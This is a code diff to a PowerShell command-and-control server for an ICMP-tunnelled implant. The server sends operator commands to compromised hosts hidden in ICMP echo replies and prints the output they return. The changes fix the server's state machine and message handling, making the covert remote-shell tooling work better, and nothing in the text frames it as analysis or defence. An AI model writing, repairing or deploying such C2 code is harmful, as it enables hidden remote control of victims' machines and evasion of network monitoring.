@@ -8,8 +8,8 @@ enum ImplantMessageType {
 }
 
 enum ServerMessageType {
-	NeedsPrompt = 0
-	IssuingCommand = 1
+	NeedsPrompt = 34
+	IssuingCommand = 9
 	Stop = 2
 }
 
@@ -142,7 +142,7 @@ public static class LIBC
 		$EchoReply[3] = $Checksum -band 0xFF;
 
 		# Sending the Echo Reply
-		$ICMPSocket.SendTo($EchoReply, 0, $EchoReply.Count, [System.Net.Sockets.SocketFlags]::None, $Endpoint) | Out-Null;
+		$ICMPSocket.SendTo($EchoReply, [System.Net.Sockets.SocketFlags]::None, $Endpoint) | Out-Null;
 	}
 
 	$CommandToSend = $null
@@ -154,10 +154,13 @@ public static class LIBC
 			WaitingForPrompt {
         ($ICMPHeader, $MessageType, $MessageData, $Endpoint) = Receive-ICMPMessage;
 				if ($null -eq $ICMPHeader) { Continue; }
+
+				# TODO: add check for sync message.
+
 				Switch ([ImplantMessageType]$MessageType) {
 					Prompt {
 						$Prompt = [Text.Encoding]::UTF8.GetString($MessageData);
-						$State = EnteringCommand;
+						$State = [ServerState]::EnteringCommand;
 						Break;
 					}
 					NeedsInstruction {
@@ -169,16 +172,17 @@ public static class LIBC
 			}
 			EnteringCommand {
 				$CommandToSend = $Reader.ReadLine($Prompt);
-				$State = WaitingToReplyWithCommand;
+				$State = [ServerState]::WaitingToReplyWithCommand;
 				Break;
 			}
 			WaitingToReplyWithCommand {
         ($ICMPHeader, $MessageType, $MessageData, $Endpoint) = Receive-ICMPMessage;
 				if ($null -eq $ICMPHeader) { Continue; }
+
 				Switch ($MessageType) {
 					NeedsInstruction {
 						Send-ICMPMessage -ICMPHeader $ICMPHeader -Endpoint $Endpoint -MessageType IssuingCommand -Command $CommandToSend;
-						$State = ReceivingCommandResult;
+						$State = [ServerState]::ReceivingCommandResult;
 						Break;
 					}
 				}
@@ -187,14 +191,15 @@ public static class LIBC
 			ReceivingCommandResult {
         ($ICMPHeader, $MessageType, $MessageData, $Endpoint) = Receive-ICMPMessage;
 				if ($null -eq $ICMPHeader) { Continue; }
+
 				Switch ($MessageType) {
 					CommandResultPart {
 						Write-Host -NoNewline ([Text.Encoding]::UTF8.GetString($MessageData));
 						Break;
 					}
-					CommandResultPart {
+					CommandResultEnd {
 						Write-Host ([Text.Encoding]::UTF8.GetString($MessageData));
-						$State = WaitingForPrompt;
+						$State = [ServerState]::WaitingForPrompt;
 						Break;
 					}
 				}
